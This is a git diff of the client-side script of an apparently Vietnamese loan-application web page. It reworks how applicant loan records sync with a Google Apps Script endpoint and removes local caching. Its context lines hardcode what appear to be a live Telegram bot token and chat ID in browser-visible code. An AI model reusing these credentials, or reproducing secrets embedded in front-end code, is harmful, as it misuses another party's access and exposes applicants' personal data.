@@ -590,10 +590,10 @@
     <script>
         const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
         const CHAT_ID = "8348914397";
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHpRwmdjeTMiuP14LiJR21s0sZ0pK-F6G4AztG4WDvDwZVDsLjBm6Vs6oKrmdL3Me/exec";
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfyby19BasDTD2UKc9zmk9ghzvw9f7ejsFuqNi809nMV7XAf0b_XqgO3Ib69V_";
 
         let formData = {};
-        let allLoans = JSON.parse(localStorage.getItem('ff_loans_cloud') || '[]');
+        let allLoans = [];
         let currentSelectedLoanId = null;
         let currentFilter = 'ALL';
 
@@ -643,31 +643,21 @@
             showModal("Thành Công", "Đã lưu cấu hình hỗ trợ thành công!");
         }
 
-        // Tải dữ liệu từ Google Sheets
         async function fetchCloudData() {
             try {
                 let res = await fetch(SCRIPT_URL);
                 let json = await res.json();
                 if(json && Array.isArray(json.loans)) {
                     allLoans = json.loans.reverse();
-                    localStorage.setItem('ff_loans_cloud', JSON.stringify(allLoans));
                 }
             } catch(e) {
-                allLoans = JSON.parse(localStorage.getItem('ff_loans_cloud') || '[]');
+                console.log("Lỗi đồng bộ mây");
             }
             if(isAdminLoggedIn) renderAdminLoanList();
         }
 
-        // Lưu / Cập nhật dữ liệu lên Google Sheets
         async function saveCloudData(loanObj) {
-            let existsIndex = allLoans.findIndex(l => String(l.user || l.User) === String(loanObj.user || loanObj.User));
-            if(existsIndex !== -1) {
-                allLoans[existsIndex] = loanObj;
-            } else {
-                allLoans.unshift(loanObj);
-            }
-            localStorage.setItem('ff_loans_cloud', JSON.stringify(allLoans));
-
+            allLoans.unshift(loanObj);
             try {
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
@@ -678,10 +668,8 @@
             } catch(e) {}
         }
 
-        // Xóa đơn trên Google Sheets và bộ nhớ
         async function deleteCloudData(userPhone) {
             allLoans = allLoans.filter(l => String(l.user || l.User) !== String(userPhone));
-            localStorage.setItem('ff_loans_cloud', JSON.stringify(allLoans));
             try {
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
@@ -774,7 +762,7 @@
             allLoans[currentSelectedLoanId].Note = document.getElementById('editNote').value;
 
             await saveCloudData(allLoans[currentSelectedLoanId]);
-            renderAdminLoanList();
+            await fetchCloudData();
             closeAdminDetail();
             showModal("Thành Công", "Đã cập nhật trạng thái tiến độ: " + newStatus);
         }
@@ -794,9 +782,9 @@
             l.Note = l.note;
 
             await saveCloudData(l);
-            renderAdminLoanList();
+            await fetchCloudData();
             closeAdminDetail();
-            showModal("Thành Công", "Đã lưu lại thông tin đơn vay lên Google Sheets!");
+            showModal("Thành Công", "Đã lưu lại thông tin đơn vay!");
         }
 
         async function deleteCurrentLoan() {
@@ -804,7 +792,7 @@
             if(confirm("Bạn có chắc chắn muốn xóa vĩnh viễn đơn vay này không?")) {
                 let userPhone = allLoans[currentSelectedLoanId].user || allLoans[currentSelectedLoanId].User;
                 await deleteCloudData(userPhone);
-                renderAdminLoanList();
+                await fetchCloudData();
                 closeAdminDetail();
                 showModal("Đã Xóa", "Đơn vay đã được xóa khỏi hệ thống.");
             }
@@ -868,7 +856,7 @@
             if (isAdminLoggedIn) {
                 btn.textContent = "🛡️ Quản Trị";
                 document.getElementById('adminPanel').classList.remove('hidden');
-                renderAdminLoanList();
+                fetchCloudData();
             } else if (currentUser) {
                 btn.textContent = "👤 " + (currentUserName || currentUser);
             } else {
@@ -902,7 +890,7 @@
                 document.getElementById('stepHome').classList.remove('hidden');
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
-                    renderAdminLoanList();
+                    fetchCloudData();
                 }
             } else if(tabName === 'loanInfo') {
                 document.getElementById('tabLoanInfo').classList.remove('hidden');
@@ -914,7 +902,7 @@
                 if(!currentUser && !isAdminLoggedIn) { openAuthModal(); return; }
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
-                    renderAdminLoanList();
+                    fetchCloudData();
                 } else {
                     document.getElementById('profileFullName').textContent = currentUserName || "Khách hàng";
                     document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
